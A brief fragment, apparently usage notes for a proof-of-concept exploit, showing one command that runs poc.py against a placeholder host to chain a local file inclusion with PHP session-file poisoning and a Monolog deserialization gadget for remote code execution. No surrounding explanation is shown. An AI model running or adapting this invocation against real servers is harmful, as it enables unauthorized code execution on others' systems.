LFI + adaptive
python3 poc.py --remote https://target.example \
  --gadget-chain Monolog/RCE1 --gadget-cmd 'id' \
  --lfi-endpoint /index.php --lfi-param file \
  --session-path '/var/lib/php/sessions/sess_{sid}' \
  --adaptive-timing --serializer-fallback \
  --control-url https://clean.example
gadget
